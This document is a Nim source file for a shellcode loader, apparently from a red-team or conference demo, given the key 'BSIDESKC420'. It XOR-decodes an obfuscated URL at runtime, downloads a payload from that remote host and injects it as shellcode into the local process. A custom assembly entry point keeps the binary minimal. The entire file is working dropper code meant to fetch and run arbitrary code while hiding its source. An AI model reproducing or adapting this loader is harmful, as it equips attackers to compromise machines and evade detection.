import exec_payload, get_payload
import utils/[enc, stackstr]

proc main() {.exportc: "Main".} =
  var 
    url {.stackStringA.} = "*'=4\x7f|dr\r\x00\x1eseqjp}zp\x0c\x08\x08rcyk67e0W"
    key {.stackStringA.} = "BSIDESKC420"
    pBuffer: pointer
    sSize: int
  xorStackString(url, key) 

  if getPayloadFromUrlA(CPTR(url), pBuffer, sSize):
    discard localShellcodeInjection(pBuffer, sSize)


proc start() {.asmNoStackframe, codegenDecl: "__attribute__((section (\".text\"))) $# $#$#", exportc: "start".} =
  asm """
    and rsp, 0xfffffffffffffff0
    mov rbp, rsp
    sub rsp, 0x10
    call Main
    add rsp, 0x10
    ret
  """

when isMainModule:
  start()
